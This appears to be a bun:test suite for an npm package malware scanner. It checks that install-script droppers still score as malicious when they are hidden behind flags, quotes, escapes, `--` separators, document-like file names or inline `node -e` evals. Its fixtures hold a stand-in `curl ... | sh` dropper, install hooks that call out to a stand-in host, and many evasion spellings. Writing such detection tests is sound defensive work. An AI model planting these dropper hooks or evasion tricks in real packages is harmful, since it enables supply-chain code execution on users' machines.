// Ways a package with a clearly malicious pattern scored higher than the same pattern written another way: a payload
// named like a document, an `npm run` with flags or quotes, an inline eval after other flags. Payloads are stand-ins.
import { describe, expect, test } from "bun:test";
import { analyze, expandHooks, finalize, gypCommands, isInlineDownload, planLayers, SCORE_FLOOR, type Analysis, type AnalyzeInput, type TarEntry } from "../src/index.ts";

function entry(path: string, text: string): TarEntry {
  const data = new TextEncoder().encode(text);

  return { path, size: data.length, mode: 0o644, data };
}

function scoreOf(manifest: AnalyzeInput["manifest"], files: Record<string, string>) {
  const m = { name: "probe-pkg", version: "1.0.0", license: "MIT", ...manifest };
  const all = [entry("package.json", JSON.stringify(m)), ...Object.entries(files).map(([p, t]) => entry(p, t))];
  const a: Analysis = analyze({ name: "probe-pkg", manifest: m, files: all, publisher: "a", previousPublishers: [] });
  const r = finalize(a, { publishedAt: 0, now: 1e12, deprecated: null, status: "active", statusReason: null });

  return { score: r.score, ids: r.signals.map((s) => s.id) };
}

const DROPPER = "curl -s https://example.invalid/x.sh | sh";
const EXEC = (cmd: string): string => `require('child_process').execSync(${JSON.stringify(cmd)});\n`;

describe("a payload named like a document is still code", () => {
  for (const name of ["readme.js", "security.js", "history.js", "notice.js", "license.js", "lib/changes.js", "History.min.js", "notice.cjs"]) {
    test(`${name} holding a dropper is read, though nothing resolvable loads it`, () => {
      const r = scoreOf({ main: "index.js" }, { "index.js": "module.exports = 1;\n", [name]: EXEC(DROPPER) });

      expect(r.ids).toContain("remote-shell");
      expect(r.score).toBeLessThan(SCORE_FLOOR);
    });
  }

  test("a README.md with the same text is still not read", () => {
    const r = scoreOf({ main: "index.js" }, { "index.js": "module.exports = 1;\n", "README.md": `Install: \`${DROPPER}\`\n` });

    expect(r.ids).not.toContain("remote-shell");
  });
});

describe("an install script's `npm run` is followed whatever flags or quotes it has", () => {
  const variants = ["npm run -s payload", "npm run --silent payload", "npm --silent run payload", "npm run 'payload'", 'npm run "payload"', "yarn run -s payload", "pnpm --silent run payload", "bun run --silent payload"];

  test("npm run payload is the baseline: refused", () => {
    expect(scoreOf({ scripts: { postinstall: "npm run payload", payload: DROPPER } }, {}).ids).toContain("install-download");
  });

  for (const cmd of variants) {
    test(`postinstall: ${cmd}`, () => {
      const r = scoreOf({ scripts: { postinstall: cmd, payload: DROPPER } }, {});

      expect(r.ids).toContain("install-download");
      expect(r.score).toBeLessThan(SCORE_FLOOR);
    });
  }
});

describe("a `--` ends the package manager's options: the next word is the script, with its pre and post scripts", () => {
  // npm reads nothing after `--` as its own, so an `--ignore-scripts` there is an argument to the script, and npm still
  // runs prepayload and postpayload
  for (const cmd of ["npm run -- payload", "npm run -s -- payload", "pnpm run -- payload", "yarn --silent -- payload", "npm run -- payload --ignore-scripts"]) {
    for (const hookName of ["prepayload", "payload", "postpayload"]) {
      test(`${cmd}: a dropper in ${hookName}`, () => {
        const scripts = { postinstall: cmd, prepayload: "true", payload: "true", postpayload: "true", [hookName]: DROPPER };
        const r = scoreOf({ scripts }, {});

        expect(r.ids).toContain("install-download");
        expect(r.score).toBeLessThan(SCORE_FLOOR);
      });
    }
  }

  test("an --ignore-scripts before the `--` is npm's own: the script alone", () => {
    const scripts = { postinstall: "npm run --ignore-scripts -- payload", prepayload: DROPPER, payload: "node index.js", postpayload: DROPPER };

    expect(expandHooks({ scripts })[0]?.scripts).toEqual(["postinstall", "payload"]);
  });
});

describe("npm run --ignore-scripts runs the script but not its pre and post scripts", () => {
  // npm docs, config `ignore-scripts`: `npm run`, `npm test` and the like still run their script, "but they will not run
  // any pre- or post-scripts", so a dropper in those never runs (npm 9.2 and 11.19.1 run locally print only the named
  // script). npm reads its flags anywhere in the invocation, the last one winning, so they are skipped only when nothing
  // from the npm word on could leave the flag unset
  const files = { "index.js": "module.exports = 1;\n" };

  const manifestOf = (cmd: string) => {
    const name = cmd.includes("payload") ? "payload" : "test";

    return { name, scripts: { postinstall: cmd, [name]: "node index.js", [`pre${name}`]: DROPPER, [`post${name}`]: DROPPER } };
  };

  const clean = scoreOf({ scripts: { postinstall: "npm run payload", payload: "node index.js" } }, files);

  for (const cmd of [
    "npm run --ignore-scripts payload",
    "npm --ignore-scripts run payload",
    "npm run --ignore-scripts=true payload",
    "npm run-script --ignore-scripts payload",
    "npm --ignore-scripts test",
    "npm run --ignore-scripts payload --silent",
    "npm run --ignore-scripts payload --ignore-scripts=true",
    "npm run --no-ignore-scripts other; npm run --ignore-scripts payload",
  ]) {
    test(`${cmd}: the script alone`, () => {
      const { name, scripts } = manifestOf(cmd);
      const r = scoreOf({ scripts }, files);

      expect(expandHooks({ scripts })[0]?.scripts).toEqual(["postinstall", name]);
      expect(r.ids).not.toContain("install-download");
      expect(r.score).toBe(clean.score);
    });
  }

  test("the named script itself is still read", () => {
    expect(scoreOf({ scripts: { postinstall: "npm run --ignore-scripts payload", payload: DROPPER } }, {}).ids).toContain("install-download");
  });

  // a newline ends a command: a run cut short at the end of a line never takes the next line's `npm` as its script name
  for (const cmd of ["npm run --silent\nnpm run payload", "npm --silent run\nnpm run payload"]) {
    test(`${JSON.stringify(cmd)}: the second line's run is read`, () => {
      const scripts = { build: cmd, payload: DROPPER };

      expect(expandHooks({ scripts: { postinstall: "npm run build", ...scripts } })[0]?.scripts).toContain("payload");
      expect(scoreOf({ scripts: { postinstall: cmd, payload: DROPPER } }, {}).ids).toContain("install-download");
    });
  }

  // a run inside a flag's value, or one taken for the script name, is still read: the match never consumes past the
  // package manager's word (fuzzed against main's regex, every name main finds is found)
  for (const cmd of ["npm --x=` npm run payload` run build", "npm run --x=` npm run payload`", "npm --x=`npm run payload` run build", "npm --x=$(npm run payload) run build", "echo `npm run payload`", "yarn --silent npm run payload", "npm run --silent npm run payload", "pnpm --x yarn payload", "bun run --x bun run payload"]) {
    test(`${cmd}: the inner run is read`, () => {
      const scripts = { postinstall: cmd, build: "true", npm: "true", yarn: "true", bun: "true", payload: DROPPER };

      expect(expandHooks({ scripts })[0]?.scripts).toContain("payload");
      expect(scoreOf({ scripts }, {}).ids).toContain("install-download");
    });
  }

  // where a quote after `run` makes the flag-aware reading take another name, main's reading (`run` as the name) is kept
  for (const cmd of ["pnpm run '--x", 'yarn run "other']) {
    test(`${cmd}: the script main's reading names is read`, () => {
      const scripts = { postinstall: cmd, run: DROPPER };

      expect(expandHooks({ scripts })[0]?.scripts).toContain("run");
      expect(scoreOf({ scripts }, {}).ids).toContain("install-download");
    });
  }

  // a flag's value is never read as reaching past a quote, so a run inside a quoted command substitution is still found
  for (const cmd of ['npm --x "$(npm run payload)" run build', 'npm --x="$(npm run payload)" run build']) {
    test(`${cmd}: the run inside the substitution is read`, () => {
      const scripts = { postinstall: cmd, build: "true", payload: DROPPER };

      expect(expandHooks({ scripts })[0]?.scripts).toContain("payload");
      expect(scoreOf({ scripts }, {}).ids).toContain("install-download");
    });
  }

  // npm runs them, or may: no flag, a later disable before or after the name (abbreviated, quoted, a separate `false`, or
  // built by the shell), a value other than `true`, a flag after `--` (the script's, so following them is only stricter),
  // an abbreviation apm does not read as setting it, a package manager other than npm, or any quoting, escape, expansion
  // or grouping in the command, where the words npm gets are not the words written
  for (const cmd of [
    'npm run --ignore-scripts payload --foo="a --ignore-scripts"',
    "npm run --ignore-scripts payload --foo='a --ignore-scripts'",
    "npm run --ignore-scripts payload --foo=a\\ --ignore-scripts",
    "npm run-script --ignore-scripts 'payload'",
    "npm run --ignore-scripts payload --ignore-scripts false; echo done",
    "(npm run --ignore-scripts payload)",
    "npm run --ignore-scripts payload > log",
    "npm run --ignore-scripts payload; echo $HOME",
    "npm run payload",
    "npm run --ignore-scripts=false payload",
    "npm run --ignore-scripts --no-ignore-scripts payload",
    "npm --ignore-scripts run --ignore-scripts=false payload",
    "npm run --ignore-scripts payload --no-ignore-scripts",
    "npm run --ignore-scripts payload --ignore-scripts=false",
    "npm run --ignore-scripts payload --no-ig",
    "npm run --ignore-scripts payload --ignore-scripts false",
    "npm run --ignore-scripts payload x --no-ignore-scripts",
    'npm run --ignore-scripts payload "--no-ignore-scripts"',
    "npm run --ignore-scripts payload --no-\\ignore-scripts",
    "npm run --ignore-scripts payload $FLAG",
    "npm run --ignore-scripts payload `printf -- --no-ig`",
    "npm run --ignore-scripts payload -- --no-ignore-scripts",
    "npm run --ignore-scripts payload && npm run payload",
    "npm run --ignore-scripts=1 payload",
    "npm run --ignore-scripts=yes payload",
    "npm run --ignore-scripts=TRUE payload",
    "npm run --ignore-scripts= payload",
    "npm run --ig payload",
    "npm --ignore-scripts test --no-ig",
    "yarn run --ignore-scripts payload",
  ]) {
    test(`${cmd}: its pre and post scripts too`, () => {
      const { name, scripts } = manifestOf(cmd);
      const r = scoreOf({ scripts }, files);

      expect(expandHooks({ scripts })[0]?.scripts.toSorted()).toEqual(["postinstall", `pre${name}`, name, `post${name}`].toSorted());
      expect(r.ids).toContain("install-download");
      expect(r.score).toBeLessThan(SCORE_FLOOR);
    });
  }

  test("a long script of such runs is read in linear time", () => {
    const cmd = "npm run --ignore-scripts payload; ".repeat(20_000);
    const started = performance.now();

    expect(expandHooks({ scripts: { postinstall: cmd, payload: "true" } })[0]?.scripts).toEqual(["postinstall", "payload"]);
    expect(performance.now() - started).toBeLessThan(500);
  });
});

describe("node's inline-eval flag is recognised after other flags", () => {
  const code = "\"require('https').get('https://example.invalid/x')\"";
  const plain = scoreOf({ scripts: { postinstall: `node -e ${code}` } }, {});

  for (const cmd of [`node --no-warnings -e ${code}`, `node -pe ${code}`, `node --input-type=module -e ${code}`, `nodejs -e ${code}`, `echo --result=$(node -e ${code})`, `echo "$(node --no-warnings -e ${code})"`, `echo $(node -e ${code})`, `x=$( node -e ${code} )`, `echo \`node -e ${code}\``, `echo --result=\`node -e ${code}\``]) {
    test(cmd.slice(0, 40), () => {
      const r = scoreOf({ scripts: { postinstall: cmd } }, {});

      expect(r.ids).toContain("install-download");
      expect(r.score).toBe(plain.score);
    });
  }

  // the word the shell hands node is `-e` however it is quoted or escaped
  for (const cmd of [`node '-e' ${code}`, `node "-e" ${code}`, `node \\-e ${code}`, `node '--eval' ${code}`, `node '--no-warnings' "-e" ${code}`]) {
    test(`quoted or escaped: ${cmd.slice(0, 40)}`, () => {
      const r = scoreOf({ scripts: { postinstall: cmd } }, {});

      expect(r.ids).toContain("install-download");
      expect(r.score).toBe(plain.score);
    });
  }

  // cmd.exe finds an interpreter in any case
  for (const cmd of [`Node -e ${code}`, `NODE.EXE -e ${code}`, `node.Exe --no-warnings -e ${code}`]) {
    test(`any case: ${cmd.slice(0, 40)}`, () => {
      const r = scoreOf({ scripts: { postinstall: cmd } }, {});

      expect(r.ids).toContain("install-download");
      expect(r.score).toBe(plain.score);
    });
  }
});

describe("the flag-aware reading never costs a body main reads", () => {
  // `a` holds a run of `x` 7 levels of `sh -c` down, past MAX_DEPTH; postinstall's own `npm run x` comes later and is
  // shallow. Main's traversal runs first and whole, so a deep reach only the flag-aware reading finds cannot take `x`
  const deepRef = (ref: string) => Array.from({ length: 7 }).reduce<string>((s) => `sh -c ${JSON.stringify(s)}`, ref);

  test("a deep flag-aware reach before main's shallow one", () => {
    const scripts = { postinstall: "npm run --silent a && npm run x", a: deepRef("npm run --silent x"), x: DROPPER };
    const [hook] = expandHooks({ scripts });

    expect(hook?.commands.map((c) => c.from)).toContain("scripts.x (run by scripts.postinstall)");
    expect(hook?.cut).toBeNull();
    expect(scoreOf({ scripts }, {}).ids).toContain("install-download");
  });

  test("main's own deep reach first is main's result: the hook is cut, never read as complete", () => {
    const [hook] = expandHooks({ scripts: { postinstall: "npm run a && npm run x", a: deepRef("npm run x"), x: DROPPER } });

    expect(hook?.cut).toContain("nested more than");
  });

  test("a flag-aware reach past what is left of the budget is cut, after main's commands are all read", () => {
    // `a`, read first, reaches 200 more scripts through a run only the flag-aware reading finds; main reads `a` and the
    // 150 scripts after it, which must all be read before that reach spends the budget
    const main = Array.from({ length: 150 }, (_, i) => `s${i}`);
    const extra = Array.from({ length: 200 }, (_, i) => `t${i}`);

    const scripts = {
      ...Object.fromEntries([...main, ...extra].map((n) => [n, "true"])),
      postinstall: ["npm run a", ...main.map((n) => `npm run ${n}`)].join(" && "),
      a: "npm run --silent big",
      big: extra.map((n) => `npm run ${n}`).join(" && "),
    };

    const [hook] = expandHooks({ scripts });

    expect(main.every((n) => hook?.commands.some((c) => c.from === `scripts.${n} (run by scripts.postinstall)`))).toBe(true);
    expect(hook?.cut).toContain("more than 200 commands");
  });

  test("a script the flag-aware reading reaches but cannot read keeps the standalone reading main gives it", () => {
    // main never follows `npm run --silent x`, so it reads `x` as a script no hook reaches and finds the hidden text; the
    // flag-aware reach is one level past MAX_DEPTH, and a publish-only hook's cut costs nothing, so dropping `x` from that
    // reading would score the package better than main does
    const hidden = `node -e 'console.log("${"\\x6e\\x6f\\x64\\x65".repeat(12)}")'`;
    const scripts = { prepublishOnly: Array.from({ length: 8 }).reduce<string>((s) => `sh -c ${JSON.stringify(s)}`, "npm run --silent x"), x: hidden };
    const [hook] = expandHooks({ scripts });

    expect(hook?.cut).toContain("nested more than");
    expect(hook?.scripts).not.toContain("x");

    const r = scoreOf({ scripts }, {});

    expect(r.ids).toContain("encoded-data");
    expect(r.score).toBeLessThan(scoreOf({ scripts: { ...scripts, x: "true" } }, {}).score);
  });
});

describe("the flags a command may carry are read in linear time", () => {
  // each flag has one reading (`--a` is never `-` then `-a`), or a run of them that never matches backtracks exponentially;
  // and a flag value that names an interpreter (`--conditions=node`) must not start a fresh scan of the flags after it
  for (const cmd of [`node ${"--a ".repeat(40)}x`, `npm ${"--a=b ".repeat(40)}x`, `yarn ${"--a ".repeat(40)}`, `node ${"--conditions=node ".repeat(16000)}x`, `npm ${"--c=npm ".repeat(16000)}x`, `echo ${"a ".repeat(4_000_000)}`, `node ${"--a ".repeat(1_000_000)}x`]) {
    test(`${cmd.slice(0, 24)} (${cmd.length} chars)`, () => {
      const started = performance.now();

      expandHooks({ scripts: { postinstall: cmd } });
      expect(performance.now() - started).toBeLessThan(500);
    });
  }

  // the review's input, 288 KB of `--conditions=node` that made the old regex take about 5 s, and twice that: the inline
  // eval check alone, then the whole scorer
  for (const n of [16_000, 32_000]) {
    const cmd = `node ${"--conditions=node ".repeat(n)}x`;

    test(`isInlineDownload on ${cmd.length} chars of flags`, () => {
      const started = performance.now();

      expect(isInlineDownload(cmd)).toBe(false);
      expect(performance.now() - started).toBeLessThan(100);
    });
  }

  test("the scorer on 288 KB of flags", () => {
    const started = performance.now();

    scoreOf({ scripts: { postinstall: `node ${"--conditions=node ".repeat(16_000)}x` } }, {});
    expect(performance.now() - started).toBeLessThan(1_000);
  });

  test("a 4 MiB binding.gyp command is read without a list of its words", () => {
    const [cmd = ""] = gypCommands(`{ 'targets': [{ 'sources': ['<!(echo ${"a ".repeat(2 * 1024 * 1024)})'] }] }`);
    const started = performance.now();

    expect(isInlineDownload(cmd)).toBe(false);
    expect(performance.now() - started).toBeLessThan(100);
  });
});

describe("an install script's `npm run` is followed through quoted, escaped and value-taking flags", () => {
  // npm 11.19.1 runs `payload` and its pre and post scripts for every spelling here (#16 review threads)
  for (const cmd of [
    "npm '--silent' run payload",
    'npm run "-s" payload',
    "npm run '-s' payload",
    'npm run "--silent" payload',
    'npm "--ignore-scripts" run payload',
    "npm run \\payload",
    'npm run ""payload',
    "npm --prefix . run payload",
    "npm run --prefix . payload",
    "npm run -w pkg payload",
    "npm --loglevel warn run payload",
    "yarn '--silent' payload",
    "pnpm run '-s' payload",
    "bun run '--silent' payload",
  ]) {
    test(`postinstall: ${cmd}`, () => {
      const r = scoreOf({ scripts: { postinstall: cmd, payload: DROPPER } }, {});

      expect(r.ids).toContain("install-download");
      expect(r.score).toBeLessThan(SCORE_FLOOR);
    });
  }

  for (const cmd of ["npm run 'a b'", "npm run --silent 'a b'", 'npm run "a b"']) {
    test(`a quoted name with a space: ${cmd}`, () => {
      const r = scoreOf({ scripts: { postinstall: cmd, "a b": DROPPER } }, {});

      expect(r.ids).toContain("install-download");
      expect(r.score).toBeLessThan(SCORE_FLOOR);
    });
  }

  // a flag that takes a value swallows the --ignore-scripts after it, and xargs adds words apm cannot see, so npm may
  // still run the pre and post scripts
  for (const cmd of ["npm run --registry --ignore-scripts payload", "echo --no-ig | xargs npm run --ignore-scripts payload"]) {
    test(`${cmd}: its pre and post scripts too`, () => {
      const scripts = { postinstall: cmd, prepayload: "true", payload: "true", postpayload: DROPPER };

      expect(expandHooks({ scripts })[0]?.scripts.toSorted()).toEqual(["postinstall", "prepayload", "payload", "postpayload"].toSorted());
      expect(scoreOf({ scripts }, {}).ids).toContain("install-download");
    });
  }

  test("a script of many quoted runs is read in linear time", () => {
    const cmd = "npm run '-s' payload; ".repeat(20_000);
    const started = performance.now();

    expect(expandHooks({ scripts: { postinstall: cmd, payload: "true" } })[0]?.scripts).toContain("payload");
    expect(performance.now() - started).toBeLessThan(500);
  });
});

describe("node's inline-eval flag is recognised after a flag whose value is the next word", () => {
  const code = "\"require('https').get('https://example.invalid/x')\"";
  const plain = scoreOf({ scripts: { postinstall: `node -e ${code}` } }, {});

  for (const cmd of [`node --conditions dev -e ${code}`, `node --redirect-warnings file -e ${code}`, `node -r ./x.js -e ${code}`, `node "--conditions" "dev" "-e" ${code}`]) {
    test(cmd.slice(0, 40), () => {
      const r = scoreOf({ scripts: { postinstall: cmd } }, {});

      expect(r.ids).toContain("install-download");
      expect(r.score).toBe(plain.score);
    });
  }

  test("a program's own arguments after its path are not node's", () => {
    expect(isInlineDownload("node install.js -e https")).toBe(false);
  });
});


describe("what only the flag-aware reading adds never displaces what main's reading reaches", () => {
  test("a streamed plan with room for one file holds the direct install target, not one reached through a quoted flag", () => {
    const enc = new TextEncoder();
    const file = (path: string, text: string): TarEntry => ({ path, size: enc.encode(text).length, mode: 0o644, data: enc.encode(text) });
    const body = "module.exports = 1;\n";
    const manifest = { name: "probe-pkg", version: "1.0.0", scripts: { preinstall: "npm run '-s' setup", setup: "node lib/hidden.js", postinstall: "node direct.js" } };
    const files = [file("lib/hidden.js", body), file("direct.js", body)];
    const plan = planLayers({ manifest, files, imports: new Map(), budget: body.length });

    expect([...plan.production]).toEqual(["direct.js"]);
  });

  test("an invocation only the shell reading finds runs pre and post scripts, though another runs the same script alone", () => {
    const scripts = { postinstall: "npm run --ignore-scripts payload; npm run '-s' payload", prepayload: "true", payload: "true", postpayload: DROPPER };

    expect(expandHooks({ scripts })[0]?.scripts).toContain("postpayload");
  });

  for (const cmd of ["echo --no-ig | /usr/bin/xargs npm run --ignore-scripts payload", "echo --no-ig |xargs npm run --ignore-scripts payload"]) {
    test(`${cmd}: xargs by path or beside an operator is a doubt`, () => {
      expect(expandHooks({ scripts: { postinstall: cmd, prepayload: "true", payload: "true", postpayload: DROPPER } })[0]?.scripts).toContain("postpayload");
    });
  }

  for (const cmd of ["n''pm run payload", "\\npm run '-s' payload", 'npm run "\\payload"']) {
    test(`a manager or name built by quotes or escapes: ${cmd}`, () => {
      expect(expandHooks({ scripts: { postinstall: cmd, payload: DROPPER, "\\payload": DROPPER } })[0]?.scripts.some((s) => s.endsWith("payload"))).toBe(true);
    });
  }

  test("a boolean node flag takes no value: a program's own arguments are not node's", () => {
    const cmd = "node --no-warnings server.js -p 3000 https://example.invalid";

    expect(isInlineDownload(cmd)).toBe(false);
  });
});

